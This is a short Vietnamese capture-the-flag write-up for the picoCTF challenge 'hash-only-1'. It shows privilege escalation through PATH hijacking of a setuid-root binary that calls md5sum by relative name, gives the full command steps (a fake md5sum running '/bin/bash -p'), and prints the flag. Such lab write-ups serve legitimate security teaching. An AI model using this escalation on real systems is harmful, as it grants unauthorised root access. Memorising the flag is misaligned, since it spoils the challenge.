# **Challege: hash-only-1**
- Đây là 1 challenge về việc chiếm quyền root ở bash remote: *privileged* 
- ssh đến bash của họ, lấy file bin về dịch ngược tìm lỗ hổng.
- Ta thấy lỗ hổng nằm ở dòng này:
std::string::basic_string(v13, "/bin/bash -c 'md5sum /root/flag.txt'", &v11);
- Mặc dù chương trình gọi /bin/bash (đường dẫn tuyệt đối), nhưng lệnh md5sum bên trong lại không có đường dẫn tuyệt đối (nó nên là /usr/bin/md5sum).
- Do chương trình đã thực hiện setuid(0) (chạy với quyền root), nếu ta đánh lừa được chương trình chạy file md5sum giả mạo của ta thay vì file thật, ta sẽ có quyền root.

- Nên ta sẽ đến 1 thư mục /tmp
- Tạo file md5sum với nội dung "/bin/bash -p" : ```echo "/bin/bash -p" > md5sum```
- Cấp quyền thực thi cho md5sum: ```chmod +x md5sum```
- Chèn thư mục chứa file giả (/tmp) vào đầu biến PATH. Khi đó, hệ thống sẽ tìm thấy file của bạn trước file thật.```export PATH=/tmp:$PATH```
- Cuối cùng chạy ```./flaghasher``` lấy lấy quyền root

Flag:
```picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_5a6b64e2}```